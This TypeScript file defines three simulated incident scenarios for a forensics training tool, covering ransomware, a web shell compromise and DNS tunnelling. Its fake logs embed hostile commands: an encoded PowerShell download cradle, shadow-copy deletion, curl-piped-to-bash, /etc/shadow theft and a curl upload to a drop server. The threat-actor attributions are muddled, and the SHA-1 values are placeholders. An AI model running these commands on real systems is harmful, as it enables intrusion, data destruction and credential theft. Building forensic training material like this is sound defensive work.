import { CaseMetadata, EvidenceItem } from './types';
import { computeSha256Simulated, computeMd5Simulated } from './hasher';

export interface IncidentScenario {
  id: string;
  name: string;
  subtitle: string;
  difficulty: 'Entry Level' | 'Intermediate' | 'Advanced';
  metadata: CaseMetadata;
  evidenceItems: EvidenceItem[];
}

// Scenario 1: Enterprise Ransomware & Anti-Forensics
const SCENARIO_1_LOGS = `2026-10-24T01:14:22Z [Security-Event-4624] An account was successfully logged on. TargetUserName: Administrator, WorkstationName: WKST-FIN-09, LogonType: 3 (Network), SourceIp: 192.168.1.105
2026-10-24T01:15:04Z [Security-Event-4688] A new process has been created. CreatorProcessName: explorer.exe, NewProcessName: cmd.exe, ProcessId: PID: 4092, CommandLine: cmd.exe /c whoami /all
2026-10-24T01:16:30Z [Security-Event-4688] A new process has been created. CreatorProcessName: cmd.exe, NewProcessName: powershell.exe, ProcessId: PID: 4510, CommandLine: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA6ADgAMAA4ADAALwBiAC4AcABzADEAJwApAA==
2026-10-24T01:18:12Z [Security-Event-7045] A new service was installed in the system. ServiceName: WindowsDefenderUpdateSvc, ServiceFileName: C:\\Windows\\Temp\\srvmgr.exe, ServiceType: user mode service
2026-10-24T01:20:45Z [Security-Event-4688] A new process has been created. CreatorProcessName: srvmgr.exe, NewProcessName: vssadmin.exe, ProcessId: PID: 5120, CommandLine: vssadmin delete shadows /all /quiet
2026-10-24T01:21:10Z [Security-Event-4688] A new process has been created. CreatorProcessName: srvmgr.exe, NewProcessName: bcdedit.exe, ProcessId: PID: 5188, CommandLine: bcdedit /set {default} recoveryenabled no
2026-10-24T01:22:05Z [Security-Event-4688] A new process has been created. CreatorProcessName: srvmgr.exe, NewProcessName: bcdedit.exe, ProcessId: PID: 5210, CommandLine: bcdedit /set {default} bootstatuspolicy ignoreallfailures
2026-10-24T01:25:30Z [Security-Event-1102] The audit log was cleared. SubjectUserSid: S-1-5-21-3920-500, SubjectUserName: Administrator, Domain: CORP-FIN`;

const SCENARIO_1_MEMORY = `Volatility Foundation Volatility Framework 2.6.1
PID: 1420, Process: spoolsv.exe, Offset: 0x7fa28100, Malfind Plugin Findings:
Process: spoolsv.exe Pid: 1420 Address: 0x00400000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
0x00400000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x00400010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
0x00400020  fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b   ......\`..1.d.P0.
Netscan Output:
Offset(P)          Proto    Local Address          Foreign Address      State      Pid   Owner
0x0000000002a83100 TCPv4    192.168.1.105:49712    185.220.101.4:443    ESTABLISHED 1420  spoolsv.exe
0x0000000002b19200 TCPv4    192.168.1.105:49718    185.220.101.4:8080   ESTABLISHED 4510  powershell.exe`;

// Scenario 2: Web Shell Intrusion & Privilege Escalation
const SCENARIO_2_LOGS = `2026-10-24T00:45:10Z [NGINX-ACCESS] 194.26.29.112 - - [24/Oct/2026:00:45:10 +0000] "POST /api/v1/attachment HTTP/1.1" 200 1482 "CVE-2023-34362 Exploit Payload" "python-requests/2.28.1"
2026-10-24T00:46:22Z [NGINX-ACCESS] 194.26.29.112 - - [24/Oct/2026:00:46:22 +0000] "GET /uploads/wso_shell.php?cmd=whoami HTTP/1.1" 200 48 "-" "Mozilla/5.0"
2026-10-24T00:47:01Z [AUTH-SYS] Oct 24 00:47:01 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root by www-data(uid=33)
2026-10-24T00:47:50Z [AUTH-SYS] Oct 24 00:47:50 web-prod-01 CRON[18492]: (root) CMD (/bin/bash -c "curl -s http://91.240.118.172/bot.sh | bash")
2026-10-24T00:49:15Z [AUDITD] type=EXECVE msg=audit(1729730955.102:491): argc=3 a0="/bin/sh" a1="-c" a2="cat /etc/shadow > /tmp/.creds.bak"
2026-10-24T00:52:00Z [AUDITD] type=EXECVE msg=audit(1729731120.401:498): argc=4 a0="curl" a1="-F" a2="file=@/tmp/.creds.bak" a3="http://91.240.118.172/drop"`;

// Scenario 3: Covert DNS Tunneling & Exfiltration
const SCENARIO_3_LOGS = `2026-10-24T03:00:10Z [ZEEK-DNS] 10.0.4.15 -> 10.0.0.2:53 QNAME: dXNlci1kYXRhLXNlY3JldHMK.tunnel.exfil-corp.top QTYPE: TXT STATUS: NOERROR
2026-10-24T03:00:12Z [ZEEK-DNS] 10.0.4.15 -> 10.0.0.2:53 QNAME: Y29uZmlkZW50aWFsLXByb2plY3Qtd2hpdGVwYXBlcgo=.tunnel.exfil-corp.top QTYPE: TXT STATUS: NOERROR
2026-10-24T03:00:15Z [ZEEK-DNS] 10.0.4.15 -> 10.0.0.2:53 QNAME: MGEwZjkxOGFiZDE0OTAyODNmOTBhMTI4MzkxMDk4MmMK.tunnel.exfil-corp.top QTYPE: TXT STATUS: NOERROR
2026-10-24T03:05:40Z [SURICATA-ALERT] [1:2018959:4] ET POLICY Suspicious DNS Query with Base64 Payload in Subdomain [Classification: Potentially Bad Traffic] [Priority: 1] {UDP} 10.0.4.15:58210 -> 10.0.0.2:53
2026-10-24T03:10:00Z [HOST-PROCESS] PID: 7812 Image: C:\\Windows\\System32\\certutil.exe CommandLine: certutil -urlcache -split -f http://45.142.214.9/payload.bin C:\\Users\\Public\\p.exe
2026-10-24T03:12:30Z [HOST-PROCESS] PID: 8014 Image: C:\\Users\\Public\\p.exe CommandLine: C:\\Users\\Public\\p.exe --recon --upload`;

export const PRECONFIGURED_SCENARIOS: IncidentScenario[] = [
  {
    id: 'SCN-DARKBIT',
    name: 'Operation DarkBit: Enterprise Ransomware & Anti-Forensics',
    subtitle: 'Windows Event Logs, Volume Shadow Deletion, LSASS Credential Access & RWX Injected Memory',
    difficulty: 'Advanced',
    metadata: {
      id: 'CAS-2026-0891',
      title: 'Investigation of DarkBit Ransomware Deployment & Log Purge',
      incidentType: 'Ransomware',
      examinerName: 'Agent Alex Mercer, GCFE / CISSP',
      examinerTitle: 'Lead Digital Forensics Specialist',
      agency: 'Cyber Incident Response Unit (CIRU)',
      dateCreated: '2026-10-24T02:00:00Z',
      status: 'ACTIVE_INVESTIGATION',
      classification: 'TLP:AMBER+STRICT',
      caseSummary:
        'Unauthorized domain administrative session established on WKST-FIN-09, resulting in execution of obfuscated PowerShell, service persistence, deletion of Volume Shadow copies via vssadmin, and intentional clearing of Security Event Logs (Event 1102). Memory inspection revealed Cobalt Strike beacon injection into spoolsv.exe.',
      leadSuspectOrThreatActor: 'FIN7 / BlackByte Affiliate (UNC2452 Pattern)',
    },
    evidenceItems: [
      {
        id: 'EVD-001',
        name: 'Domain Controller Security Event Logs',
        filename: 'DC01_Security_Audit.evtx',
        fileType: 'evtx_logs',
        sizeBytes: 14820000,
        md5: computeMd5Simulated(SCENARIO_1_LOGS),
        sha1: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b',
        sha256: computeSha256Simulated(SCENARIO_1_LOGS),
        acquiredAt: '2026-10-24T01:45:00Z',
        acquiredBy: 'Forensic Investigator A. Mercer',
        writeBlockerModel: 'Tableau T8u Forensic USB 3.0 Bridge (S/N: TAB-88219)',
        rawContent: SCENARIO_1_LOGS,
        parsedArtifactsCount: 8,
        integrityVerified: true,
        custodyLog: [
          {
            id: 'COC-001-A',
            timestamp: '2026-10-24T01:45:00Z',
            action: 'ACQUISITION',
            actor: 'A. Mercer (CIRU)',
            location: 'Data Center Rack 04B, Host DC01',
            notes: 'Physical write blocker verified; raw image acquired directly to encrypted evidence storage.',
            hashMatch: true,
            algorithm: 'SHA-256',
            hashValue: computeSha256Simulated(SCENARIO_1_LOGS),
          },
          {
            id: 'COC-001-B',
            timestamp: '2026-10-24T02:00:00Z',
            action: 'HASH_VERIFICATION',
            actor: 'ForensiQ Automated Integrity Engine',
            location: 'Evidence Locker Node 01',
            notes: 'Cryptographic hash bitstream verification succeeded; 100% hash parity with acquisition manifest.',
            hashMatch: true,
            algorithm: 'SHA-256',
            hashValue: computeSha256Simulated(SCENARIO_1_LOGS),
          },
        ],
      },
      {
        id: 'EVD-002',
        name: 'Volatile Physical RAM Snapshot',
        filename: 'DC01_PhysicalMemory.raw',
        fileType: 'memory_dump',
        sizeBytes: 16777216,
        md5: computeMd5Simulated(SCENARIO_1_MEMORY),
        sha1: '3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e',
        sha256: computeSha256Simulated(SCENARIO_1_MEMORY),
        acquiredAt: '2026-10-24T01:50:00Z',
        acquiredBy: 'Forensic Investigator A. Mercer',
        writeBlockerModel: 'LiME / WinPmem Live RAM Acquisition Bridge',
        rawContent: SCENARIO_1_MEMORY,
        parsedArtifactsCount: 6,
        integrityVerified: true,
        custodyLog: [
          {
            id: 'COC-002-A',
            timestamp: '2026-10-24T01:50:00Z',
            action: 'ACQUISITION',
            actor: 'A. Mercer (CIRU)',
            location: 'Host DC01 Physical Console',
            notes: 'Captured under Order of Volatility: RAM captured prior to disk powering down.',
            hashMatch: true,
            algorithm: 'SHA-256',
            hashValue: computeSha256Simulated(SCENARIO_1_MEMORY),
          },
        ],
      },
    ],
  },
  {
    id: 'SCN-GHOSTSHELL',
    name: 'Operation GhostShell: Web Application RCE & Privilege Escalation',
    subtitle: 'CVE-2023-34362 Ingestion, Web Shell Dropper, Root Privilege Escalation & Credential Dump',
    difficulty: 'Intermediate',
    metadata: {
      id: 'CAS-2026-0904',
      title: 'Investigation of DMZ Web Server Compromise via File Upload RCE',
      incidentType: 'Web Shell Compromise',
      examinerName: 'Investigator Priya Sharma, EnCE',
      examinerTitle: 'Senior Incident Responder',
      agency: 'CERT National Defense Laboratory',
      dateCreated: '2026-10-24T01:10:00Z',
      status: 'ACTIVE_INVESTIGATION',
      classification: 'TLP:AMBER+STRICT',
      caseSummary:
        'Perimeter web server web-prod-01 was breached via CVE-2023-34362 file upload endpoint. Adversary deployed wso_shell.php web shell, abused sudo misconfiguration to escalate to root, and exfiltrated /etc/shadow to drop server 91.240.118.172.',
      leadSuspectOrThreatActor: 'Storm-0558 Sub-Group',
    },
    evidenceItems: [
      {
        id: 'EVD-003',
        name: 'Web Server Access & Linux System Logs',
        filename: 'web_prod_01_sys_access.log',
        fileType: 'syslog',
        sizeBytes: 8940000,
        md5: computeMd5Simulated(SCENARIO_2_LOGS),
        sha1: '1234567890abcdef1234567890abcdef12345678',
        sha256: computeSha256Simulated(SCENARIO_2_LOGS),
        acquiredAt: '2026-10-24T01:00:00Z',
        acquiredBy: 'Investigator Priya Sharma',
        writeBlockerModel: 'Hardware Read-Only SATA Docking Bay (CRU WiebeTech)',
        rawContent: SCENARIO_2_LOGS,
        parsedArtifactsCount: 6,
        integrityVerified: true,
        custodyLog: [
          {
            id: 'COC-003-A',
            timestamp: '2026-10-24T01:00:00Z',
            action: 'ACQUISITION',
            actor: 'Priya Sharma (CERT)',
            location: 'DMZ Hypervisor Cluster Alpha',
            notes: 'Virtual disk snapshot exported with cryptographic checksum verified.',
            hashMatch: true,
            algorithm: 'SHA-256',
            hashValue: computeSha256Simulated(SCENARIO_2_LOGS),
          },
        ],
      },
    ],
  },
  {
    id: 'SCN-REDTUNNEL',
    name: 'Operation RedTunnel: Covert DNS Tunneling & C2 Exfiltration',
    subtitle: 'Zeek DNS Logs, Base64 Encoded Query Stream, Certutil Payload Ingress & Exfiltration',
    difficulty: 'Entry Level',
    metadata: {
      id: 'CAS-2026-0919',
      title: 'Investigation of Stealthy DNS Exfiltration from Research Subnet',
      incidentType: 'Data Exfiltration',
      examinerName: 'Forensic Tech Marcus Vance',
      examinerTitle: 'Cyber Defense Forensics Analyst',
      agency: 'Critical Infrastructure Forensics Team',
      dateCreated: '2026-10-24T03:15:00Z',
      status: 'ACTIVE_INVESTIGATION',
      classification: 'TLP:AMBER+STRICT',
      caseSummary:
        'Network telemetry revealed high-volume TXT record DNS requests originating from workstation 10.0.4.15 destined for domain exfil-corp.top, smuggling encoded intellectual property. Host processes subsequently invoked certutil to retrieve secondary stage payload.',
      leadSuspectOrThreatActor: 'APT29 / Cozy Bear Emulation',
    },
    evidenceItems: [
      {
        id: 'EVD-004',
        name: 'Zeek Network & Sensor Telemetry',
        filename: 'dns_suricata_stream.log',
        fileType: 'pcap_network',
        sizeBytes: 12400000,
        md5: computeMd5Simulated(SCENARIO_3_LOGS),
        sha1: 'fedcba0987654321fedcba0987654321fedcba09',
        sha256: computeSha256Simulated(SCENARIO_3_LOGS),
        acquiredAt: '2026-10-24T03:14:00Z',
        acquiredBy: 'Forensic Tech Marcus Vance',
        writeBlockerModel: 'Gigamon Inline TAP / Network Packet Broker',
        rawContent: SCENARIO_3_LOGS,
        parsedArtifactsCount: 6,
        integrityVerified: true,
        custodyLog: [
          {
            id: 'COC-004-A',
            timestamp: '2026-10-24T03:14:00Z',
            action: 'ACQUISITION',
            actor: 'Marcus Vance',
            location: 'Sensor Interface TAP-02',
            notes: 'PCAP stream converted to normalized Zeek TSV with integrity hash generated at capture interface.',
            hashMatch: true,
            algorithm: 'SHA-256',
            hashValue: computeSha256Simulated(SCENARIO_3_LOGS),
          },
        ],
      },
    ],
  },
];
